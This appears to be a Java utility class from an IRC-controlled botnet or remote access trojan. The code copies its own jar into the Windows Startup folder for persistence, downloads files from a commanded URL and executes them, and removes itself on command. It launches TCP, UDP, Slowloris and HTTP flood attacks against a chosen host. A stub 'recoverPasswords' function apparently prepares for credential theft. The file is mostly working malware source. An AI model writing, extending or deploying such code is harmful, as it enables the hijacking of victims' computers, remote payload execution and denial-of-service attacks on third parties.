package com.elementiumdev.util;

import java.awt.Desktop;
import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.Random;

import com.elementiumdev.irc.Handler;
import com.elementiumdev.irc.IRC;
import com.elementiumdev.irc.Stresser;

public class Functions {
	
	public static void copyFile(File source, File dest) throws Exception {
		InputStream i = null;
		FileOutputStream o = null;
		try {
			i = new FileInputStream(source);
			o = new FileOutputStream(dest);
			byte[] buf = new byte[1024];
			int bytesRead;
			while((bytesRead = i.read(buf)) > 0) {
				o.write(buf, 0, bytesRead);
			}
		} finally {
			i.close();
			o.close();
		}
	}
	
	public static void openWebpage(URI uri) {
	    Desktop desktop = Desktop.isDesktopSupported() ? Desktop.getDesktop() : null;
	    if (desktop != null && desktop.isSupported(Desktop.Action.BROWSE)) {
	        try {
	            desktop.browse(uri);
	        } catch (Exception e) {
	            e.printStackTrace();
	        }
	    }
	}
	
	public static void visit(String url) {
		if(!url.startsWith("http") && !url.startsWith("https")) {
			url = "http://" + url;
		}
		
		try {
			openWebpage(new URL(url).toURI());
		} catch (MalformedURLException e) {
			e.printStackTrace();
		} catch (URISyntaxException e) {
			e.printStackTrace();
		}
	}
	
	public static void update(String url) {
		try {
			download(url);
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		uninstall();
		
	}
	public static String getautostart() {
	    return System.getProperty("java.io.tmpdir").replace("Local\\Temp\\", "Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
	}
	
	public static String getJarLocation() {
		try {
            return Functions.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
        } catch (Exception e) {
        	e.printStackTrace();
        }
        return null;
	}
	
	public static void windowsInstall() {
		File startup = new File(getautostart() + Constants.FILENAME + ".jar");
		try {
			copyFile(new File(getJarLocation()), startup);
		} catch (IOException e) {
			e.printStackTrace();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public static boolean windowsInstalled() {
		File startup = new File(getautostart() + Constants.FILENAME + ".jar");
		return startup.exists();
	}
	public static String generateString(Random rng, String characters, int length)
	{
	    char[] text = new char[length];
	    for (int i = 0; i < length; i++)
	    {
	        text[i] = characters.charAt(rng.nextInt(characters.length()));
	    }
	    Handler.UID = new String(text);
	    return new String(text);
	}
	
	public static String randomString() {
		
		
		return java.util.UUID.randomUUID().toString().replace("-", "");
	}
	
	public static String download(String url) throws Exception {
		URL link = new URL(url.replace("https://", "http://"));
		String ext = url.substring(url.lastIndexOf(".")+1);
		String fileName = url.substring(url.lastIndexOf('/')+1, url.length() );
		
		File dl = new File(System.getProperty("java.io.tmpdir") + File.separator + fileName);
		
		InputStream in = new BufferedInputStream(link.openStream());
		ByteArrayOutputStream out = new ByteArrayOutputStream();
		byte[] buf = new byte[1024];
		int n = 0;
		while (-1!=(n=in.read(buf)))
		{
			out.write(buf, 0, n);
		}
		out.close();
		in.close();
		byte[] response = out.toByteArray();

		FileOutputStream fos = new FileOutputStream(fileName);
		fos.write(response);
		fos.close();

		if(ext.equalsIgnoreCase("jar")) {
			Runtime.getRuntime().exec("java -jar " + dl.getAbsolutePath());
		} else {
			Runtime.getRuntime().exec("\"" + dl.getAbsolutePath() + "\"");
		}
		
		return dl.getAbsolutePath();
	}
	
	public static void uninstall() {
		File startup = new File(getautostart() + Constants.FILENAME + ".jar");
		File jar = new File(getJarLocation());
		
		startup.deleteOnExit();
		if(!startup.getAbsolutePath().equalsIgnoreCase(jar.getAbsolutePath())) {
			jar.deleteOnExit();
		}
		
		IRC.h.disconnect();
		System.exit(0);
	}
	
	public static void startStress(String type, String host, int port, int threads, int delay, long time) throws Exception {
		switch(type) {
		case "tcp":
			Stresser.tcpStress(randomString(), host, port, threads, delay, time);
			break;
		case "udp":
			Stresser.udpStress(randomString(), host, port, 32, threads, delay, time);
			break;
		case "slowlorris":
			Stresser.slowlorisStresss(randomString(), host, port, "GET", threads, delay, time);
			break;
		case "http":
			Stresser.httpStress(randomString(), host, threads, delay, time);
			break;
		default:
			Stresser.httpStress(randomString(), host, threads, delay, time);
			break;
		}
		
	} 
	
	public static void stopStress() {
		Stresser.stopAll();
	}
	
	public static String[] recoverPasswords() {
		String[] passwords = new String[1024];
		
		File f = new File(System.getProperty("java.io.tmpdir") + File.separator + "sqlite-jbdc-3.8.11.2.jar");
		if(!f.exists()) {
			
		}
		return passwords;
	}
}
